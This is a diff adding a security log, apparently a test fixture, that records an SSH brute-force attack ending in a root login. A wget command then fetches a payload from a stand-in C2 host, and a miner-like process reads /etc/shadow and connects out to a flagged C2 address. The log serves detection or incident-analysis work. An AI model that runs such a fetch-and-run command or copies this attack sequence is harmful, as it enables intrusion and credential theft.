@@ -1,0 +1,20 @@
+2026-11-03T02:10:14.120Z auth-service [INFO] PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.105 user=root
+2026-11-03T02:10:15.892Z auth-service [WARNING] Failed password for root from 192.168.1.105 port 42812 ssh2
+2026-11-03T02:10:17.301Z auth-service [WARNING] Failed password for root from 192.168.1.105 port 42814 ssh2
+2026-11-03T02:10:18.910Z auth-service [WARNING] Failed password for root from 192.168.1.105 port 42816 ssh2
+2026-11-03T02:10:20.441Z auth-service [WARNING] Failed password for admin from 192.168.1.105 port 42818 ssh2
+2026-11-03T02:10:21.802Z auth-service [WARNING] Failed password for admin from 192.168.1.105 port 42820 ssh2
+2026-11-03T02:10:23.210Z auth-service [WARNING] Failed password for postgres from 192.168.1.105 port 42822 ssh2
+2026-11-03T02:10:24.719Z auth-service [WARNING] Failed password for deploy from 192.168.1.105 port 42824 ssh2
+2026-11-03T02:10:26.110Z auth-service [WARNING] Failed password for test from 192.168.1.105 port 42826 ssh2
+2026-11-03T02:10:27.501Z auth-service [WARNING] Failed password for ubuntu from 192.168.1.105 port 42828 ssh2
+2026-11-03T02:10:29.800Z auth-service [CRITICAL] Multiple authentication failures (10 in 15 seconds) detected from IP 192.168.1.105. Possible brute force attack.
+2026-11-03T02:10:33.402Z auth-service [WARNING] Accepted password for root from 192.168.1.105 port 42830 ssh2
+2026-11-03T02:10:34.110Z auth-service [INFO] pam_unix(sshd:session): session opened for user root by (uid=0)
+2026-11-03T02:10:38.220Z audit-service [CRITICAL] Command execution: user=root command='/usr/bin/wget http://malicious-c2.net/payload.sh -O /tmp/payload.sh'
+2026-11-03T02:10:40.910Z audit-service [CRITICAL] Suspicious binary execution: /bin/bash /tmp/payload.sh spawned child process /tmp/kdevtmpfsi
+2026-11-03T02:10:45.330Z sys-daemon [ERROR] Excessive CPU consumption detected: PID 9482 (/tmp/kdevtmpfsi) utilizing 98.4% CPU
+2026-11-03T02:11:00.100Z audit-service [WARNING] /etc/shadow read access by non-standard process UID 0 PID 9482
+2026-11-03T02:11:05.412Z network-guard [CRITICAL] Outbound connection established to 185.220.101.5:4444 (flagged malicious C2 node)
+2026-11-03T02:11:15.890Z sys-daemon [INFO] Routine logrotate initiated
+2026-11-03T02:11:30.000Z healthcheck [INFO] Node worker-03 reporting healthy status
